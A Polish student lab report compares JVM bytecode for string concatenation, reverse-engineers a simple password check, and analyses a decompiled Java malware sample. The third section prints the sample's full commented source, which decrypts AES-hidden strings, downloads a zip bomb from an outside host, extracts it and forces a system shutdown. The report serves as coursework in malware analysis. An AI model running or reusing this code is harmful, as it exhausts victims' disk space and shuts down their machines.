# Michał Wawrzyńczak 303730
# Sprawozdanie Lab5

## Zad1
W tym zadaniu napisałem dwa proste programy jeden łączący dwa stingi przy pomocy operatora += a drugi używający klasy StringBulider:

- +=
```java
public class Main {
    public static void main(String[] args) {
        String str1 = "jeden";
        String str2 = "dwa";
        str1 += str2;
    }
}
```

- StringBulider
```java
public class Main {
    public static void main(String[] args) {
        String str1 = "jeden";
        String str2 = "dwa";
        StringBuilder bulider = new StringBuilder(str1);
        bulider.append(str2);
    }
}
```

Nastęnie wygenerować z obu kod assemblera obu programów, opisać i porównać: 

- +=
```
    	 0: ldc           #2            	// String jeden Wczytanie stringa "jeden"
         2: astore_1				// wrzucenie referencji do stringa "jeden" na stos
         3: ldc           #3              	// String dwa Wczytanie stringa dwa
         5: astore_2				// wrzucenie referencji do stringa "dwa" na stos
         6: aload_1				// załadowanie strina "jeden" ze stosu
         7: aload_2				// załadowanie strina "dwa" ze stosu
         8: invokedynamic #4,  0              	// Połączenie stringa "jeden" ze stringiem "dwa"
        13: astore_1				// zapisanie referencji do "jedendwa: w miejsce stringa "jeden"
        14: return				// koniec    
```

- StringBulider
```
         0: ldc           #2                  	// wczytanie stringa "jeden"
         2: astore_1				// wrzucenie refernecji do stringa "jeden" na stos
         3: ldc           #3            	// wczytanie stringa dwa
         5: astore_2				// wrzucenie refernecji do stringa "dwa" na stos
         6: new           #4                  	// stworzenie instancji klasy - class java/lang/StringBuilder
         9: dup					// zduplikowanie wartości refernecji na górze stusu
        10: aload_1				// załadowanie stringa "jeden"
        11: invokespecial #5                  	// inicjalizacja instancji klasy StringBulider ze stringiem "jeden" Method java/lang/StringBuilder."<init>":(Ljava/lang/String;)V
        14: astore_3				// zapisanie refernecji do StringBulidera na stosie
        15: aload_3				// Wczytanie string bulidera ze stosu
        16: aload_2				// Wczytanie stringa "dwa" ze stosu
        17: invokevirtual #6                 	// Połączenie "jeden" z "dwa"  - Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        20: pop					// zdjęcie ostatniej wartości ze stosu
        21: return				// koniec
```

Porównując kody assemblerowe tych dwóch metod konkatenowania srtringów, ciężko mi jednoznacznie stwierdzić które z rozwiązań
jest "lepsze" jedyne co mogę powiedzić to, że klasa StringBulider do przechowywanie danych stringa wykorzystuje strukturę
stosu, natomiest klasa String podczas konkatenacji wykorzustuje "stałą pulę stringów"

W Internecie znalazłem krótkie zestawienie w postaci tabeli prównujące te dwie metody łaczenia stringów.

![stringVsStrBuild](/uploads/3b954bfd35af522fc86ee4771d6bca61/stringVsStrBuild.png)


## Zad2
Zadaniem było przeanalizowanie i opisanie kodu, oraz opis w jaki sposób generowane jest hasło do naszego programu

**Hasło: N9Qd:7U_2020**

W programie hasło generowane jest w następujący sposób:
1. Podany 7-znakowy ciąg znaków jest modyfikowany w taki sposób, że każdy znak tego ciągu zamieniany jest na kolejny znak w tablicy kodowej (szyfr cezara o offsecie = 1)
2. Z systemu zczytywana jest aktualy rok i parsowany jako int
3. Ciąg z punktu 1 i liczba z punktu 2 są konkatenowana bo wcześniejszym wstawieniu znaku "_" pomiędzy te dwie wartości
4. Powstały w punkcie 3 String dodawany jest do jedno elementowej tablicy stingów
5. Tablica z punktu 4 jest naszym hasłem.


- Klasa Main
```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.text.SimpleDateFormat;
import java.time.Instant;
import java.util.Date;

public class Main {
    public Main() {
    }

    public static void main(String[] var0) throws Exception { //password: N9Qd:7U_2020
        if (var0.length != 1) {         //jeśli długość tablicy wejściowej var0 różna od 1 oznacza to błędne hasło
            System.out.println("Wrong password!");
        } else {
            String var1 = var0[0];      //zmienna var1 przyjmuje wartość jedynej wartości z tablicy var0
            String[] var2 = var1.split("_");    //string z zmiennej var 1 dzielony na tablicę stringów, separatorem jest "_"
            Date var3 = Date.from(Instant.now());   //zmienna var3 zawierająca aktualną datę
            SimpleDateFormat var4 = new SimpleDateFormat("yyyy");   //zmienna var4 format dla daty zawierający jedynie rok
            String var5 = var4.format(var3);        //zmienna var5 zawiera datę var3 według formatu var4 czyli aktualny rok
            int var6 = Integer.parseInt(var5);      // rok ten jest rzutowany na inta 2020
            if (var2[0].length() == 7 && var2[1].length() == 4) {   // sprawdzenie czy string na pozycji 0 w tablicy var2 ma długość 7, a na pozycji 1 długość 4
                if (var2[0].equals(Coder.code("M8Pc96T")) && Integer.parseInt(var2[1]) == var6) {
                    //sprawdzenie czy funkcja code dla podanego ciągu znaków zwraca vwartość var2[0] i czy var2[1] to aktualny rok
                    System.out.println("Good guess");   //jeśli tak to dane wejściowe poprawne
                } else {
                    System.out.println("Wrong password!");
                }
            } else {
                System.out.println("Wrong password!");
            }

        }


    }
}
```

- Klasa Coder
```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//


public class Coder {
    public Coder() {
    }

    static String code(String var0) {
        StringBuilder var1 = new StringBuilder();

        for(int var2 = 0; var2 < var0.length(); ++var2) { //dla każdego znaku stinga wejściowego
            var1.append((char)(var0.charAt(var2) + 1));     //znak zamienia się na kolejny znak w tablicy kodowej i dodawany jest do nowego stringa (var1)
        }

        return var1.toString(); //zwrócenie powstałego stringa
    }
}
```

## Zad3
W tym zadaniu mieliśmy przeanalizować "złośliwe oprogramowanie". zaczęliśmy od rozpakowania pliku jar i jego zdekompilowania, następnie naszym zadaniem było poopisywanie poszczególne operacje wykonywane podczas działania programu oraz odpowiednio ponazywać metody i zmienne
W kodzie programu starałem się dokładnie odszyfrować i pokomentować poszczególne fragmenty. Głownym celem działania programu jest:
1. Odszyfrowanie linków i nazw plików/katalogów zaszyfrowanych przy pomocy algorytmu AES
2. Pobranie i zapisanie pliku .zip w pamięci komputera
3. Rozpakowanie pobranego pliku (jest to zipBomba czyli plik zip o małej wadze, który po rozpakowaniu posiada bardzi duży rozmiar)
4. Wyłączenie komputera

Po opisaniu poszczególnych metod zdecydowałem się na uruchomienie programu na maszynie wirtualnej, efekt działania był taki jak oczekiwany


- Skomentowany kod klasy run
```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class Run {
    private static String key = "Kjf456UjOP14Ywte";

    public Run() {
    }

    /**
     * przyjmuje stringa z hexadecymalnymi wartościami, zwraca tablicę bajtów
     * @param hexString
     * @return byteStream
     */
    private static byte[] hexStingtoByteStream(String hexString) {
        ByteArrayOutputStream byteStream = new ByteArrayOutputStream(hexString.length() / 2);

        for(int i = 0; i < hexString.length(); i += 2) {
            byteStream.write(Integer.parseInt(hexString.substring(i, i + 2), 16));
        }

        return byteStream.toByteArray();
    }


    /**
     * przyjmuje zaszyfrowaną wiadomość w postaci stringa, zwraca odszyfrowaną wiadomość w postaci Stringa
     * @param encryptedMess
     * @return
     * @throws Exception
     */
    private static String decoderAES(String encryptedMess) throws Exception {
        byte[] encryptedByte = hexStingtoByteStream(encryptedMess); //zaszyfrowane bajty
        Cipher AES = Cipher.getInstance("AES/CBC/NoPadding"); //AES / Cipher block chaining / bez uzupełnienia
        SecretKeySpec key = new SecretKeySpec(Run.key.getBytes(StandardCharsets.UTF_8), "AES");     // klucz to bajty stringa z pola statycznego key ("Kjf456UjOP14Ywte")
        IvParameterSpec initialVector = new IvParameterSpec(Run.key.getBytes(StandardCharsets.UTF_8));        // iv to bajty stringa z pola statycznego key ("Kjf456UjOP14Ywte")
        AES.init(2, key, initialVector);    //inicjowanie AES jako dekoder z kluczem i wektorem inicjalizacyjnym
        /*
            public static final int ENCRYPT_MODE = 1;
            public static final int DECRYPT_MODE = 2;
            public static final int WRAP_MODE = 3;
            public static final int UNWRAP_MODE = 4;
            public static final int PUBLIC_KEY = 1;
            public static final int PRIVATE_KEY = 2;
            public static final int SECRET_KEY = 3;
         */
        byte[] decryptedByte = AES.doFinal(encryptedByte);    //odszyfrowane bajty
        return new String(decryptedByte);                  //odszyfrowana wiadomość
    }

    /**
     * przyjmuje url do pobrania pliku, zapisuje go jako plik .zip
     * @param urlAsString
     * @throws Exception
     */
    private static void downloadAndWriteZip(String urlAsString) throws Exception {
        URL fileURL = new URL(urlAsString);

        //user.dir
        Path fileDir = Paths.get(System.getProperty(decoderAES("cf342300e78f3c21383678d00b71b225369f62782816ebd5986ae029b97f34f53fb78d0a05ece71c779ebbc83692cfe8919282626c7be128cfb6b8f285848ff5").trim()));

        //user.dir/zbsm.zip
        Path fileDirName = Paths.get(fileDir.toString(), decoderAES("b92741a781f245538d5c75ab25330b9107832a09ef2c1d461a67507930557538e1fa2c3d572d2a384e4f9d399ef8c33d09467b3ab0454b41bab9350ce3774fdf").trim());

        try {
            BufferedInputStream inputStream = new BufferedInputStream(fileURL.openStream());  //pobranie z internetu

            try {
                FileOutputStream zipFile = new FileOutputStream(fileDirName.toString());    //ściezka do pliku "user.dir/zbsm.zip"

                byte[] buffer = new byte[1024]; //pomocnicza tablica do zapisu plików

                int var7;   //pomocnicza zmienna do zapisu plików
                while((var7 = inputStream.read(buffer, 0, 1024)) != -1) {  //dopóki wejściwy strumień zawiera daane
                    zipFile.write(buffer, 0, var7);     //zapisywanie danych do "user.dir/zbsm.zip"
                }

            //obsługa wyjątków
            } catch (Throwable t2) {
                try {
                    inputStream.close();
                } catch (Throwable t1) {
                    t2.addSuppressed(t1);
                }
                throw t2;
            }

            inputStream.close();
        } catch (IOException var10) {
        }

        unZipFile(fileDirName, fileDir);
    }

    /**
     * wypakowywuje podany plik w podanej lokalizacji
     * @param fileDirName
     * @param FileDir
     */
    private static void unZipFile(Path fileDirName, Path FileDir) {
        try {
            if (!fileDirName.toFile().exists()) { //jeśli plik nie istnieje
                return;
            }

            byte[] buffer = new byte[1024]; //tablica pomocnicza
            ZipInputStream zipInputStream = new ZipInputStream(new FileInputStream(fileDirName.toString())); //odpakowane zip stream

            for(ZipEntry zipEntry = zipInputStream.getNextEntry(); zipEntry != null; zipEntry = zipInputStream.getNextEntry()) { //dopóki zipInputStream nie jest pusty
                String path = Paths.get(FileDir.toString(), zipEntry.getName()).toString(); // ścieżka do wypakowanego pliku w folderze
                FileOutputStream file = new FileOutputStream(path);


                int var7;
                while((var7 = zipInputStream.read(buffer)) > 0) { //czytanie z bufforu pliku wejściwego (zip) dopóki coś w bufforze
                    file.write(buffer, 0, var7);        //zapis zczytaniej wartości do pliku
                }

                file.close();
            }

            zipInputStream.closeEntry();
            zipInputStream.close();
        } catch (Exception e) {
        }

    }
```

- Main

    /**
     *Pobiera i wypakowywuje plik zip z internetu a następnie wyłącza komputer
     *Pobrany zip to tak zwana zipBomba czyli mały plik zip(40kB), który rozpakowywuje się do bardzo dużego dużego pliku
     */
    public static void main(String[] var0) throws Exception {

        //pobiera os.name
        String var1 = System.getProperty(decoderAES("6474658359276b25720ff106097a2663f7d139752e9f95100ac045385fd51ee58f6a4a2c6d7f2701fed0ab2fff3a66bf43f78e79af22740fe718824cff7cda98").trim());

        //Windows
        String var2 = decoderAES("054f1f395c9506dea62a842dd0a91602ef625bd2909bb87a2fbcab5a499e06013166de8c18bf9d982184785f07f59739c463c3d56327be198fcae6648f7314f4").trim();

        //https://www.bamsoftware.com/hacks/zipbomb/zbsm.zip
        downloadAndWriteZip(decoderAES("52ab37cab57dab5d50c38b06a37f12da4a093eadfd96502c3eef188a2c44e63a0cb4a60c16e3f41f0c02df264f492cf311030bd9be4a3f37db38755eef4527b9"));

        if (var1.contains(var2)) {
            //pobranie i odpakowanego pliku          shutdown /s            wyłączenie systemy (windows)
            Runtime.getRuntime().exec(decoderAES("2d830932f271350897857710196ec96453f8d261bc7f07181da0c2a10fbe2db2267c3526d61c01c1c28a004367774f64b687c76dcf6873995954a8d93f3d2f3c").trim());
        } else {
            //pobranie i odpakowanego pliku          shutdown -h now        wyłączenie systemy (linux)
            Runtime.getRuntime().exec(decoderAES("5673123e986e4c8ad4efa677a6d00b31b2007673a282e5ebc6a2738c0f603f36b372a9f85b2f598f3f76c5d43eb82e4183a123eea4031fcbb040c872e681e31f").trim());
        }

    }
}
```

